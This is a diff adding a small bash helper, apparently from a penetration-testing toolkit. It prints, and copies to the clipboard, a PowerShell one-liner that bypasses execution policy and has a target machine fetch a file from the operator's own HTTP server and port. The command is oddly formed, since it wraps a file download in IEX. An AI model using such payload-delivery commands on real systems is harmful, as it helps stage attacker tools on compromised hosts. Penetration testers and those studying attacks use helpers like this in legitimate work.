@@ -1,0 +1,9 @@
+#!/bin/bash
+if [ $# -eq 0 ]; then
+    echo "Usage: Power_Shell_Dwn [port to download from] [file name to download]"
+    exit 1
+fi
+IP=$( IP_No_Clip );                      
+New_IP=$( echo -n $IP );                                                                                                              
+echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadFile('http://$IP:$1/$2','$2')\"";
+echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadFile('http://$IP:$1/$2','$2')\"" | clip;
